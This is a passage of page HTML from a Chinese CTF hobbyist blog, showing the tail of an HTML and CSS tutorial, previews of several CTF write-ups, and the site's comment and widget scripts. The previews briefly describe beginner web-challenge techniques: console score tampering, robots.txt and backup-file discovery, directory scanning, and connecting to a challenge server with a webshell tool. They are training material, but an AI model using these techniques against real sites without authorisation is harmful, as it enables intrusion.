class="info-item-1">元素1.一个元素由开始标签，内容以及结束标签组成。 2.如果是单独呈现的标签，一个标签就代表一个元素 3.标签名对大小写不敏感 运行和预览前端工程右上角的terminal -&gt; new terminal -&gt; serve . –listen 8080 -&gt; 在预览中开启8080端口 html文档的基本结构​​ 标签 段落标签  一级标题 同理可编辑1-6级   对内容进行加粗 ​​ CSS引入123&lt;link rel=&quot;stylesheet&quot; href=&quot;./index.css&quot;&gt;&lt;!-- 或者./去掉也可以，效果是一样的 --&gt;&lt;link rel=&quot;stylesheet&quot; href=&quot;index.css&quot;&gt;  ‍ span和div互相转化：display：inline&#x2F;block display：none 即隐藏 常见写法：父子类12345&lt;div class=&quot;box&quot;&gt;        &lt;img...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2025/02/12/hgame-week1/" title="hgame week1 web wp"><img class="cover" src="/img/landscape/%E9%A3%8E%E6%99%AF9.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-02-12</div><div class="info-item-2">hgame week1 web wp</div></div><div class="info-2"><div class="info-item-1">web1235，其余方向随缘解出几道(crypto3，re1，misc24) 只写了web，其他参考sean师傅的wp Sean师傅的博客 week1排行在80左右浮动，还可以 ​Level 24 Pacman​题目要求达到一万分，本来以为是抓包改分数，结果发现抓不到包 网上看了几个相关的题目学习了一下，发现是JS源码审计 在后台查找发现分数最后计算规则涉及的代码 ​ 在分数结算时设置断点即可修改分数 控制台输入_SCORE&#x3D;100000，直接改成十万分 ​​ base64+栅栏密码即可 ​​ （补）后来发现官方wp是直接在js源文件找的，我咋当时没找着，特意回去找了一下 ​​ 666藏在中间了 ​Level 47...</div></div></div></a><a class="pagination-related" href="/2025/01/26/%E5%90%AF%E8%88%AA%E6%9D%AFCTF/" title="启航杯Seandictionary小队wp"><img class="cover" src="/img/landscape/%E9%A3%8E%E6%99%AF1.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-01-26</div><div class="info-item-2">启航杯Seandictionary小队wp</div></div><div class="info-2"><div class="info-item-1">上次国赛的群里‍sean临时召集的 排名49&#x2F;536，感谢Seandictionary、Spreng、yolo带飞，本人负责做了web，出了一道社工，也学了一点东西 MiscQHCTF For Year 2025 | FINISHED​​ 1QHCTF&#123;FUN&#125;  请找出拍摄地所在位置 | FINISHED首先定位大致范围 ​​ 聊城或者柳城 然后根据对面的“街口果酱烧烤”进行定位即可 1QHCTF&#123;广西壮族自治区柳州市柳城县六广路与榕泉路交叉口&#125;  你能看懂这串未知的文字吗| FINISHED​​ 羊文对照得到szfpguwizgwesqzoaoerv 尝试凯撒，栅栏无效，猜测是维吉尼亚 LSB隐写得到qihangbeiiseasy作为key 解得QHCTF{cryptoveryeasybysheep} ​启动！|...</div></div></div></a><a class="pagination-related" href="/2024/12/17/%E9%9A%BC%E7%9B%AECTF-wp/" title="2024 隼目CTF wp"><img class="cover" src="/img/landscape/%E9%A3%8E%E6%99%AF3.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2024-12-17</div><div class="info-item-2">2024 隼目CTF wp</div></div><div class="info-2"><div class="info-item-1">这次隼目CTF是跟sean组队，基本都是靠他撑着 我一个web蒟蒻就是一划水的，web不出意外的又爆零，misc倒是看了几道题（笑） sign in前几步还挺简单，一开始提示凯撒加密，很容易在偏移量为1的时候解码出正常数据  直接base64转图片即可，然后把图片下下来开始各种…（stegsolve，rgb爆破等等）均无果 最后死也没想出来是什么隐写…出题人上hint说是《非本地隐写》，BYD非本地隐写是在线隐写是吧  当时刚刚接触CTF的时候，一开始啥也不会，在网上随便搜就搜到的是这种隐写后来学了其他“正统”方法，这种早被我扔脑后了（悲） 夜观天象给了一个html文件，让我们在里面找东西而网页打开就是普通的歌词而已，也没别的但是发现源码里面有RGB，一开始还是考虑什么RGB隐写啥的后来发现全部抄下来16进制转换后就能得到具体信息（gift is...</div></div></div></a><a class="pagination-related" href="/2024/12/08/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%89%8D10%E9%A2%98wp%EF%BC%88%E5%BC%95%E5%AF%BC%E6%A8%A1%E5%BC%8F%EF%BC%89/" title="攻防世界引导模式 web 前10题wp"><img class="cover" src="/img/landscape/%E9%A3%8E%E6%99%AF2.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2024-12-08</div><div class="info-item-2">攻防世界引导模式 web 前10题wp</div></div><div class="info-2"><div class="info-item-1">让我们从最基础的开始看起吧qaq 因为都是较为简单的题，网上有大把详细wp，本文侧重于记录新学到的东西 此博客为本蒟蒻做的第一篇针对web的wp，如有问题还请多多指教 view_source法1：禁用右键，关我Ctrl+U什么事）） 法2：在网站前加上“view-source:”即可。 法3：直接在edge右上角打开开发人员工具，源代码中即可看到flag。 robots根据题目，了解robots协议： “robots.txt是搜索引擎中访问网站的时候要查看的第一个文件。当一个搜索蜘蛛访问一个站点时，它会首先检查该站点根目录下是否存在robots.txt，如果存在，搜索机器人就会按照该文件中的内容来确定访问的范围；如果该文件不存在，所有的搜索蜘蛛将能够访问网站上所有没有被口令保护的页面。” 直接在网站后面加&#x2F;robots.txt即可看到flag。 这里还get了一个新工具：dirsearch，马上下载下来试试，发现很方便。  backup又学到了：常见的备份文件后缀名有: .git .svn .swp .svn .~ .bak...</div></div></div></a><a class="pagination-related" href="/2024/12/02/WuCup%20CTF/" title="2024 WuCup CTF wp"><img class="cover" src="/img/landscape/%E9%A3%8E%E6%99%AF5.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2024-12-02</div><div class="info-item-2">2024 WuCup CTF wp</div></div><div class="info-2"><div class="info-item-1">0xGame作为笔者的启蒙赛事，笔者从中学习到了一些CTF的基本知识，而WuCup则是笔者第一个独立参加的网络赛事。 虽然只做出来四道题，但是99%的步骤都是本人完成)) 恰逢笔者的博客基本搭建完成，所以兴奋的把本来用PDF提交的wp转成.md格式扔到这里 Web-Sign开启题目环境后，使用webshell工具中国蚁剑连接 题目环境已经告知密码passwd为sgin  连接后打开最上层的目录，在最底下发现flag的文件夹  WuCup{253e7c29-a436-4f17-bce2-72ce13731ba3} Crypto-easy观察应该是RC4加密，直接扔kimi写脚本 1234567891011121314151617181920212223242526272829303132key = &quot;hello world&quot;# 初始化s和t数组s = list(range(256))j = 0t = [ord(c) for c in key] * (256 // len(key)) + [ord(c) for c in key][:(256 %...</div></div></div></a></div></div><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="twikoo-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/%E7%BB%BF%E8%89%B2%E5%A4%B4%E5%83%8F.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Z41sArrebol</div><div class="author-info-description">人生就是不断的折腾...</div><div id="welcome-info"></div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">9</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">9</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Z41sArrebol"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#web-honeyhot"><span class="toc-number">1.</span> <span class="toc-text">web honeyhot</span></a></li></ol></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2024 - 2025 By Z41sArrebol</div><div class="footer_custom_text"><p>欲买桂花同载酒，终不似，少年游。 <div id="runtime" style="display:inline-block"></div><p><a target="_blank" href="https://hexo.io/"><img src="https://img.shields.io/badge/Frame-Hexo-blue?style=flat&logo=hexo" title="博客框架为Hexo"></a>&nbsp;<a target="_blank" href="https://butterfly.js.org/"><img src="https://img.shields.io/badge/Theme-Butterfly-6513df?style=flat&logo=bitdefender" title="主题采用butterfly"></a>&nbsp;<a target="_blank" href="https://www.jsdelivr.com/"><img src="https://img.shields.io/badge/CDN-jsDelivr-orange?style=flat&logo=jsDelivr" title="本站使用JsDelivr为静态资源提供CDN加速"></a> &nbsp;<a target="_blank" href="https://vercel.com/ "><img src="https://img.shields.io/badge/Hosted-Vervel-brightgreen?style=flat&logo=Vercel" title="本站采用双线部署，默认线路托管于Vercel"></a>&nbsp;<a target="_blank" href="https://vercel.com/ "><img src="https://img.shields.io/badge/Hosted-Coding-0cedbe?style=flat&logo=Codio" title="本站采用双线部署，联通线路托管于Coding"></a>&nbsp;<a target="_blank" href="https://github.com/"><img src="https://img.shields.io/badge/Source-Github-d021d6?style=flat&logo=GitHub" title="本站项目由Gtihub托管"></a>&nbsp;<a target="_blank" href="http://creativecommons.org/licenses/by-nc-sa/4.0/"><img src="https://img.shields.io/badge/Copyright-BY--NC--SA%204.0-d42328?style=flat&logo=Claris" title="本站采用知识共享署名-非商业性使用-相同方式共享4.0国际许可协议进行许可"></a></p></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="前往评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"><script>(() => {
+  const isShuoshuo = GLOBAL_CONFIG_SITE.isShuoshuo
+  const option = null
+
+  const getCount = () => {
+    const countELement = document.getElementById('twikoo-count')
+    if(!countELement) return
+    twikoo.getCommentsCount({
+      envId: 'z41sarrebol-github-io.vercel.app',
+      region: 'ap-jiangsu',
+      urls: [window.location.pathname],
+      includeReply: false
+    }).then(res => {
+      countELement.textContent = res[0].count
+    }).catch(err => {
+      console.error(err)
+    })
+  }
+
+  const init = (el = document, path = location.pathname) => {
+    twikoo.init({
+      el: el.querySelector('#twikoo-wrap'),
+      envId: 'z41sarrebol-github-io.vercel.app',
+      region: 'ap-jiangsu',
+      onCommentLoaded: () => {
+        btf.loadLightbox(document.querySelectorAll('#twikoo .tk-content img:not(.tk-owo-emotion)'))
+      },
+      ...option,
+      path: isShuoshuo ? path : (option && option.path) || path
+    })
+
+    
+
+    isShuoshuo && (window.shuoshuoComment.destroyTwikoo = () => {
+      if (el.children.length) {
+        el.innerHTML = ''
+        el.classList.add('no-comment')
+      }
+    })
+  }
+
+  const loadTwikoo = (el, path) => {
+    if (typeof twikoo === 'object') setTimeout(() => init(el, path), 0)
+    else btf.getScript('https://cdn.jsdelivr.net/npm/twikoo/dist/twikoo.all.min.js').then(() => init(el, path))
+  }
+
+  if (isShuoshuo) {
+    'Twikoo' === 'Twikoo'
+      ? window.shuoshuoComment = { loadComment: loadTwikoo }
+      : window.loadOtherComment = loadTwikoo
+    return
+  }
+
+  if ('Twikoo' === 'Twikoo' || !false) {
+    if (false) btf.loadComment(document.getElementById('twikoo-wrap'), loadTwikoo)
+    else loadTwikoo()
+  } else {
+    window.loadOtherComment = loadTwikoo
+  }
+})()</script></div><canvas id="universe"></canvas><script defer src="/js/universe.js"></script><script src="https://cdn.nesxc.com/js/leaves.js"></script><script defer src="https://rmt.dogedoge.com/fetch/~/source/jsdelivr/npm/jquery@latest/dist/jquery.min.js"></script><script defer src="https://cdn.jsdelivr.net/gh/sirxemic/jquery.ripples/dist/jquery.ripples.js"></script><script defer src="/js/ripples.js"></script><script src="https://cdn.staticfile.org/jquery/3.6.3/jquery.min.js"></script><script async data-pjax src="/js/txmap.js"></script><script async src="/js/fps.js"></script><script defer src="/js/runtime.js"></script><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="25" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-nest.min.js"></script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-show-text.min.js" data-mobile="false" data-text="典,乐,急,孝,绷,赢,唐,麻,润" data-fontsize="20px" data-random="true" async="async"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>
